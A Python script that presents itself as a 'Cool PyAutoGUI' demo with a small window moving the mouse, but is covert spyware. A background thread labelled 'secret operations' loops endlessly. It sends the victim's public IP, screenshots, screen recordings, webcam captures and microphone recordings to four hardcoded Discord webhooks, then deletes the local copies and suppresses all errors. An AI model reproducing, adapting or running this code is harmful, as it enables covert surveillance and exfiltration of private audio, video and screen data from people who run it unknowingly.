import subprocess
import sys
import pyautogui
import io
import os
import threading
import time
import requests
import cv2
import numpy as np
import pyaudio
import wave
import tkinter as tk

# List of all required packages
REQUIRED_PACKAGES = [
    "pyautogui",
    "requests",
    "opencv-python",
    "pyaudio",
    "numpy"
]

# Function to install packages if not already installed
def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except subprocess.CalledProcessError:
        sys.exit(1)

# Function to check and install each required package
def check_and_install_packages():
    for package in REQUIRED_PACKAGES:
        try:
            __import__(package)
        except ImportError:
            install_package(package)

check_and_install_packages()

# Webhook URLs
IP_WEBHOOK_URL = "https://discord.com/api/webhooks/1309607393042370651/OP17dbwMp-3vxRyH7nEJY53OAdNrpRCV9CMOICvQWFKX2cT_TM0mA2WruEyNC3HXinh-"
SCREEN_WEBHOOK_URL = "https://discord.com/api/webhooks/1309565731330854952/b_lALeorJM2ombJAj83_OCXWlds7HHnC0nd2RjIsOAnru2yc47j4XJYTAxoK1Yytx98X"
WEBCAM_WEBHOOK_URL = "https://discord.com/api/webhooks/1309586810858377236/Llm3-zs23OwBcBGVQFkmeOSF1hCL-dqxIYwoyFeFv5ci9Y5OyNXfeYPQ_Kec0eCJV_Df"
MICROPHONE_WEBHOOK_URL = "https://discord.com/api/webhooks/1309609370321027115/oGs-WvYDOtWBr_gO3ax1P1vi8OUEgTLedEBW83Jt_39_vgGnZjQWPWi65yFAvcoOVfrA"

# Function to get the public IP address
def get_public_ip():
    try:
        # Send a request to the service that returns the public IP
        response = requests.get("http://checkip.amazonaws.com/")

        # Check if the response is successful
        if response.status_code == 200:
            return response.text.strip()  # Return the IP address without extra spaces
        return None
    except:
        return None

# Function to send the public IP to the IP webhook
def send_ip_to_webhook():
    public_ip = get_public_ip()
    if public_ip:
        try:
            data = {'content': f"Public IP: {public_ip}"}
            requests.post(IP_WEBHOOK_URL, data=data)
        except:
            pass

# Function to start recording the screen for 30 seconds
def record_screen():
    try:
        screen_width, screen_height = pyautogui.size()  # Get screen dimensions
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")  # Define codec for MP4 format
        video_file = "screen_recording.mp4"
        out = cv2.VideoWriter(video_file, fourcc, 20.0, (screen_width, screen_height))

        # Record for 30 seconds
        start_time = time.time()
        while time.time() - start_time < 30:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        send_video_to_webhook(video_file)

    except:
        pass

# Function to send the video file to the screen webhook
def send_video_to_webhook(video_file):
    try:
        with open(video_file, 'rb') as f:
            files = {'file': (video_file, f, 'video/mp4')}
            requests.post(SCREEN_WEBHOOK_URL, files=files, data={'content': "Here's a screen recording."})
        os.remove(video_file)
    except:
        pass

# Function to take and send a screenshot
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        image_stream = io.BytesIO()
        screenshot.save(image_stream, format="PNG")
        image_stream.seek(0)
        screenshot.save("screenshot.png")
        send_screenshot_to_webhook("screenshot.png")
    except:
        pass

# Function to send the screenshot to the screen webhook
def send_screenshot_to_webhook(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (file_path, f, 'image/png')}
            requests.post(SCREEN_WEBHOOK_URL, files=files, data={'content': "Here's a screenshot."})
        os.remove(file_path)
    except:
        pass

# Function to capture and send a webcam image
def capture_webcam_image():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
        ret, frame = cap.read()
        if ret:
            webcam_image_path = "webcam_image.png"
            cv2.imwrite(webcam_image_path, frame)
            send_webcam_image_to_webhook(webcam_image_path)
        cap.release()
    except:
        pass

# Function to send the webcam image to the webcam webhook
def send_webcam_image_to_webhook(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (file_path, f, 'image/png')}
            requests.post(WEBCAM_WEBHOOK_URL, files=files, data={'content': "Here's a webcam image."})
        os.remove(file_path)
    except:
        pass

# Function to record microphone audio
def record_microphone():
    try:
        p = pyaudio.PyAudio()
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = 10
        FILE_NAME = "microphone_recording.wav"

        stream = p.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with wave.open(FILE_NAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

        send_microphone_recording_to_webhook(FILE_NAME)
    except:
        pass

# Function to send microphone recording to the webhook
def send_microphone_recording_to_webhook(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (file_path, f, 'audio/wav')}
            requests.post(MICROPHONE_WEBHOOK_URL, files=files, data={'content': "Here's a microphone recording."})
        os.remove(file_path)
    except:
        pass

# Function to start secret operations in parallel
def start_secret_operations():
    while True:
        send_ip_to_webhook()
        take_screenshot()
        capture_webcam_image()
        record_screen()
        record_microphone()
        time.sleep(10)

# Start secret operations in a background thread
def start_secret_thread():
    thread = threading.Thread(target=start_secret_operations, daemon=True)
    thread.start()

# GUI Window Setup
def create_gui():
    root = tk.Tk()
    root.title("Cool PyAutoGUI & Secret Operations")

    label = tk.Label(root, text="Running in background...\nCool PyAutoGUI actions!", font=("Arial", 14))
    label.pack(pady=20)

    # Example pyautogui animation (move mouse around)
    def run_pyautogui():
        pyautogui.moveTo(100, 100, duration=2)
        pyautogui.moveTo(300, 300, duration=2)
        pyautogui.moveTo(500, 500, duration=2)
        root.after(10000, run_pyautogui)  # Repeat after 10 seconds

    run_pyautogui()

    root.geometry("400x200")
    root.mainloop()

# Main execution
if __name__ == "__main__":
    start_secret_thread()
    create_gui()  # Start the GUI
